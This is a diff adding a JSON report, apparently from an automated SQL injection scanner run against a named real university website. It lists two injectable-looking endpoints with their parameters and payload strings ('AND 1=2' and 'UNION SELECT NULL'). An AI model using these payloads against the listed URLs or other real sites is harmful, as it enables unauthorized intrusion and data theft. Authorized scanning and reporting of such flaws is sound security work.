@@ -1,0 +1,29 @@
+{
+  "success": true,
+  "target": "https://www.cuchd.in/",
+  "deep_scan": true,
+  "total_vulnerabilities": 2,
+  "risk_score": 40,
+  "vulnerabilities": [
+    {
+      "parameter": "Type",
+      "payload": "jpp20191' AND '1'='2",
+      "type": "Boolean-based Blind SQL Injection",
+      "evidence": "Boolean-based difference detected",
+      "severity": "MEDIUM",
+      "location": "https://www.cuchd.in/placements/frmRegistration.aspx",
+      "timestamp": "2026-06-10T22:20:13.422852"
+    },
+    {
+      "parameter": "q",
+      "payload": "' UNION SELECT NULL--",
+      "type": "Union-based SQL Injection",
+      "evidence": "Union-based injection possible",
+      "severity": "MEDIUM",
+      "location": "https://www.cuchd.in/searchresult.php",
+      "timestamp": "2026-06-10T22:20:44.313744"
+    }
+  ],
+  "scan_id": "51ef2471",
+  "timestamp": "2026-06-10T22:20:44.314395"
+}
